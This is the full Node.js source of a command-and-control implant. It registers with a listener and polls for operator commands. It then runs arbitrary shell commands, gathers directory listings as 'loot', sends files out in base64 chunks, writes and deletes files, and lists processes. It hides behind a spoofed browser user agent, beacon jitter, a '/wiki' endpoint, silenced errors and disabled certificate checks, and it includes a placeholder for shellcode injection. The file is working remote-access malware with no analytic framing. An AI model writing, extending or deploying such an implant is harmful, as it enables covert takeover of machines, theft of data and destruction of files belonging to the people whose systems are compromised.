#!/usr/bin/env node

const crypto = require('crypto');
const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { exec, spawn } = require('child_process');
const { promisify } = require('util');

const execAsync = promisify(exec);

// Build-time configuration
const LISTENER_HOST = process.env.ANOMALY_HOST || 'localhost';
const LISTENER_PORT = process.env.ANOMALY_PORT || '8082';
const LISTENER_ENDPOINT = process.env.ANOMALY_ENDPOINT || '/wiki';
const HMAC_KEY = process.env.ANOMALY_HMAC_KEY || '069290530a27e8a2d9c377d02e295a62907cd11705899217201fdbe75fa5d169';
const RECONNECT_INTERVAL = parseInt(process.env.ANOMALY_INTERVAL || '15', 10);
const JITTER_SECONDS = parseInt(process.env.ANOMALY_JITTER || '10', 10);
const USER_AGENT = process.env.ANOMALY_USER_AGENT || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

// Constants
const CHUNK_SIZE = 2 * 1024 * 1024; // 2MB
const CHUNK_THRESHOLD = 10 * 1024 * 1024; // 10MB

// Global state
const state = {
    agentId: generateUUID(),
    reconnectInterval: RECONNECT_INTERVAL,
    jitterSeconds: JITTER_SECONDS,
    currentCommandId: 0
};

// Generate UUID v4
function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
        const r = (Math.random() * 16) | 0;
        const v = c === 'x' ? r : (r & 0x3) | 0x8;
        return v.toString(16);
    });
}

// HMAC generation
function generateHMAC(message, key) {
    const hmac = crypto.createHmac('sha256', key);
    hmac.update(message);
    return hmac.digest('hex');
}

// Sign request
function signRequest(method, path, body) {
    const timestamp = Math.floor(Date.now() / 1000).toString();
    const message = `${method}${path}${timestamp}${body}`;
    const signature = generateHMAC(message, HMAC_KEY);
    return { timestamp, signature };
}

// Wrap data with HMAC
function wrapWithHMAC(data) {
    const jsonData = JSON.stringify(data);
    const { timestamp, signature } = signRequest('POST', LISTENER_ENDPOINT, jsonData);
    return JSON.stringify({
        data: JSON.parse(jsonData),
        timestamp,
        signature
    });
}

// Send HTTPS request
function sendHTTPSRequest(endpoint, data, headers = {}) {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: LISTENER_HOST,
            port: LISTENER_PORT,
            path: endpoint,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': USER_AGENT,
                'Content-Length': Buffer.byteLength(data),
                ...headers
            },
            rejectUnauthorized: false
        };

        const req = https.request(options, (res) => {
            let body = '';
            res.on('data', (chunk) => body += chunk);
            res.on('end', () => {
                resolve({
                    status: res.statusCode,
                    body: body
                });
            });
        });

        req.on('error', reject);
        req.write(data);
        req.end();
    });
}

// Send signed request
async function sendSignedRequest(data, customHeaders = {}) {
    const wrappedData = wrapWithHMAC(data);
    const headers = { 'Content-Type': 'application/json', ...customHeaders };
    return await sendHTTPSRequest(LISTENER_ENDPOINT, wrappedData, headers);
}

// Parse HTTPS response
function parseHTTPSResponse(respData) {
    if (respData.status !== 200) {
        throw new Error(`Request failed with status ${respData.status}`);
    }
    
    try {
        return JSON.parse(respData.body);
    } catch (e) {
        return {};
    }
}

// Get local IP address
function getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                return iface.address;
            }
        }
    }
    return 'unknown';
}

// Register agent
async function registerAgent() {
    const registration = {
        uuid: state.agentId,
        name: `Agent-${state.agentId.substring(0, 8)}`,
        ip: getLocalIP(),
        os: `${os.platform()} ${os.arch()}`,
        reconnectInterval: state.reconnectInterval
    };

    const resp = await sendSignedRequest(registration);
    parseHTTPSResponse(resp);
}

// Get pending commands
async function getPendingCommands() {
    const pollRequest = { agentId: state.agentId };
    const resp = await sendSignedRequest(pollRequest);
    const result = parseHTTPSResponse(resp);
    return result.commands || [];
}

// Send command response
async function sendCommandResponse(commandId, output, status) {
    const response = {
        commandId,
        output,
        status
    };

    const headers = {};
    if (output.includes('LOOT_ENTRIES:')) {
        headers.type = 'loot';
    }

    await sendSignedRequest(response, headers);
}

// Format file size
function formatFileSize(size) {
    if (size === 0) return '0B';
    const units = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(size) / Math.log(1024));
    return `${(size / Math.pow(1024, i)).toFixed(1)}${units[i]}`;
}

// Handle ls command
async function handleLs(args) {
    const targetPath = args[0] || '.';
    const absPath = path.resolve(targetPath);

    const stats = await fs.promises.stat(absPath);
    if (!stats.isDirectory()) {
        throw new Error('Not a directory');
    }

    const entries = await fs.promises.readdir(absPath, { withFileTypes: true });
    let result = `📁 ${absPath}\n`;
    const lootEntries = [];

    // Sort: directories first, then files
    const dirs = entries.filter(e => e.isDirectory());
    const files = entries.filter(e => !e.isDirectory());

    for (const entry of dirs) {
        const fullPath = path.join(absPath, entry.name);
        result += `├── 📁 ${entry.name}/\n`;
        lootEntries.push({
            type: 'directory',
            path: fullPath,
            name: entry.name,
            size: 0
        });
    }

    for (const entry of files) {
        const fullPath = path.join(absPath, entry.name);
        const stats = await fs.promises.stat(fullPath);
        result += `├── 📄 ${entry.name} (${formatFileSize(stats.size)})\n`;
        lootEntries.push({
            type: 'file',
            path: fullPath,
            name: entry.name,
            size: stats.size
        });
    }

    if (lootEntries.length > 0) {
        result += `\nLOOT_ENTRIES:${JSON.stringify(lootEntries)}`;
    }

    return result;
}

// Handle get command (small files)
async function handleGetSmallFile(filePath) {
    const content = await fs.promises.readFile(filePath);
    const hash = crypto.createHash('md5').update(content).digest('hex');
    const base64Content = content.toString('base64');
    const filename = path.basename(filePath);

    const lootEntry = {
        type: 'file',
        name: filename,
        path: path.resolve(filePath),
        size: content.length,
        content: base64Content,
        md5: hash
    };

    return `got ${filename}!\nLOOT_ENTRIES:${JSON.stringify([lootEntry])}`;
}

// Handle get command (chunked files)
async function handleGetChunkedFile(filePath) {
    const content = await fs.promises.readFile(filePath);
    const fileSize = content.length;
    const filename = path.basename(filePath);
    const totalChunks = Math.ceil(fileSize / CHUNK_SIZE);
    const expectedMd5 = crypto.createHash('md5').update(content).digest('hex');

    // Initiate transfer
    const initReq = {
        agentId: state.agentId,
        commandId: state.currentCommandId,
        filename,
        originalPath: path.resolve(filePath),
        totalSize: fileSize,
        totalChunks,
        expectedMd5
    };

    const initResp = await sendSignedRequest(initReq);
    const initResult = parseHTTPSResponse(initResp);
    const sessionId = initResult.sessionId;

    // Upload chunks
    for (let i = 0; i < totalChunks; i++) {
        const start = i * CHUNK_SIZE;
        const end = Math.min(start + CHUNK_SIZE, fileSize);
        const chunkData = content.slice(start, end);
        const chunkMd5 = crypto.createHash('md5').update(chunkData).digest('hex');

        const chunkReq = {
            sessionId,
            chunkIndex: i,
            chunkData: chunkData.toString('base64'),
            chunkMd5
        };

        await sendSignedRequest(chunkReq);
    }

    // Complete transfer
    const completeReq = { sessionId, complete: true };
    await sendSignedRequest(completeReq);

    return `got ${filename}! (${fileSize} bytes in ${totalChunks} chunks, md5=${expectedMd5})`;
}

// Handle get command
async function handleGet(args) {
    if (args.length === 0) {
        throw new Error('usage: get <filepath>');
    }

    const filePath = path.resolve(args[0]);
    const stats = await fs.promises.stat(filePath);

    if (stats.size < CHUNK_THRESHOLD) {
        return await handleGetSmallFile(filePath);
    } else {
        return await handleGetChunkedFile(filePath);
    }
}

// Handle put command
async function handlePut(args) {
    if (args.length < 2) {
        throw new Error('usage: put <filepath> <hex_data>');
    }

    const filePath = args[0].replace(/^"|"$/g, '');
    const hexData = args[1].replace(/^"|"$/g, '');
    const fileData = Buffer.from(hexData, 'hex');

    const dir = path.dirname(filePath);
    await fs.promises.mkdir(dir, { recursive: true });
    await fs.promises.writeFile(filePath, fileData);

    return `File uploaded successfully: ${filePath} (${fileData.length} bytes)`;
}

// Handle cd command
async function handleCd(args) {
    if (args.length === 0) {
        return process.cwd();
    }

    process.chdir(args[0]);
    return `Changed directory to: ${process.cwd()}`;
}

// Handle kill command
async function handleKill(args) {
    setTimeout(() => process.exit(0), 1000);
    return 'Agent terminating...';
}

// Handle ps command
async function handlePs(args) {
    if (os.platform() === 'win32') {
        const { stdout } = await execAsync('tasklist /FO CSV /NH');
        return stdout;
    } else {
        const { stdout } = await execAsync('ps aux');
        return stdout;
    }
}

// Handle exec command
async function handleExec(args) {
    if (args.length === 0) {
        throw new Error('usage: exec <command>');
    }

    const command = args.join(' ');
    const { stdout, stderr } = await execAsync(command);
    return stdout + stderr;
}

// Handle reconnect command
async function handleReconnect(args) {
    if (args.length === 0) {
        return `Current reconnect interval: ${state.reconnectInterval} seconds\nUsage: reconnect <seconds>`;
    }

    const newInterval = parseInt(args[0], 10);
    if (newInterval < 5 || newInterval > 3600) {
        throw new Error('Interval must be between 5 and 3600 seconds');
    }

    const oldInterval = state.reconnectInterval;
    state.reconnectInterval = newInterval;
    return `Reconnect interval changed from ${oldInterval} to ${newInterval} seconds`;
}

// Handle rm command
async function handleRm(args) {
    if (args.length === 0) {
        throw new Error('usage: rm <filepath>');
    }

    const filePath = path.resolve(args[0]);
    const stats = await fs.promises.stat(filePath);

    if (stats.isDirectory()) {
        throw new Error('Cannot remove directory with rm (use rmdir)');
    }

    await fs.promises.unlink(filePath);
    return `Removed file: ${filePath}`;
}

// Handle rmdir command
async function handleRmdir(args) {
    if (args.length === 0) {
        throw new Error('usage: rmdir <dirpath>');
    }

    const dirPath = path.resolve(args[0]);
    const stats = await fs.promises.stat(dirPath);

    if (!stats.isDirectory()) {
        throw new Error('Not a directory (use rm for files)');
    }

    await fs.promises.rm(dirPath, { recursive: true, force: true });
    return `Removed directory: ${dirPath}`;
}

// Handle jitter command
async function handleJitter(args) {
    if (args.length === 0) {
        return `Current jitter: +/- ${state.jitterSeconds} seconds\nUsage: jitter <seconds>`;
    }

    const newJitter = parseInt(args[0], 10);
    if (newJitter < 0 || newJitter > 300) {
        throw new Error('Jitter must be between 0 and 300 seconds');
    }

    const oldJitter = state.jitterSeconds;
    state.jitterSeconds = newJitter;
    return `Jitter changed from +/- ${oldJitter} to +/- ${newJitter} seconds`;
}

// Handle injectsc command (not implemented for cross-platform)
async function handleInjectSc(args) {
    return 'Shellcode injection not implemented in Node.js version';
}

// Parse command arguments respecting quotes
function parseCommandArgs(command) {
    const parts = [];
    let current = '';
    let inQuotes = false;
    let quoteChar = '';
    
    for (let i = 0; i < command.length; i++) {
        const char = command[i];
        
        if ((char === '"' || char === "'") && !inQuotes) {
            // Start of quoted string
            inQuotes = true;
            quoteChar = char;
        } else if (char === quoteChar && inQuotes) {
            // End of quoted string
            inQuotes = false;
            quoteChar = '';
        } else if (char === ' ' && !inQuotes) {
            // Space outside quotes - delimiter
            if (current.length > 0) {
                parts.push(current);
                current = '';
            }
        } else {
            // Regular character
            current += char;
        }
    }
    
    // Add last part
    if (current.length > 0) {
        parts.push(current);
    }
    
    return parts;
}

// Execute command
async function executeCommand(command) {
    const parts = parseCommandArgs(command.trim());
    if (parts.length === 0) {
        throw new Error('Empty command');
    }

    const cmd = parts[0];
    const args = parts.slice(1);

    switch (cmd) {
        case 'ls': return await handleLs(args);
        case 'get': return await handleGet(args);
        case 'put': return await handlePut(args);
        case 'cd': return await handleCd(args);
        case 'kill': return await handleKill(args);
        case 'ps': return await handlePs(args);
        case 'exec': return await handleExec(args);
        case 'reconnect': return await handleReconnect(args);
        case 'rm': return await handleRm(args);
        case 'rmdir': return await handleRmdir(args);
        case 'jitter': return await handleJitter(args);
        case 'injectsc': return await handleInjectSc(args);
        default:
            // Try to execute as system command
            const { stdout, stderr } = await execAsync(command);
            return stdout + stderr;
    }
}

// Calculate interval with jitter
function calculateIntervalWithJitter() {
    if (state.jitterSeconds === 0) {
        return state.reconnectInterval;
    }

    const jitter = Math.floor(Math.random() * (state.jitterSeconds * 2 + 1)) - state.jitterSeconds;
    const interval = state.reconnectInterval + jitter;
    return Math.max(1, interval);
}

// Command polling loop
async function commandLoop() {
    while (true) {
        const interval = calculateIntervalWithJitter();
        await new Promise(resolve => setTimeout(resolve, interval * 1000));

        try {
            const commands = await getPendingCommands();

            for (const cmd of commands) {
                if (cmd.status === 'pending') {
                    state.currentCommandId = cmd.id;

                    let output;
                    try {
                        output = await executeCommand(cmd.command);
                    } catch (error) {
                        output = `Error: ${error.message}`;
                    }

                    await sendCommandResponse(cmd.id, output, 'completed');
                }
            }
        } catch (error) {
            // Silently continue on error
        }
    }
}

// Main function
async function main() {
    // Initial jitter
    if (state.jitterSeconds > 0) {
        const initialJitter = Math.floor(Math.random() * (state.jitterSeconds + 1));
        await new Promise(resolve => setTimeout(resolve, initialJitter * 1000));
    }

    // Registration loop
    while (true) {
        try {
            await registerAgent();
            break;
        } catch (error) {
            await new Promise(resolve => setTimeout(resolve, state.reconnectInterval * 1000));
        }
    }

    // Start command polling
    await commandLoop();
}

// Error handling
process.on('uncaughtException', (err) => {
    // Silently ignore to avoid crashes
});

process.on('unhandledRejection', (err) => {
    // Silently ignore to avoid crashes
});

// Start the agent
main().catch(() => process.exit(1));


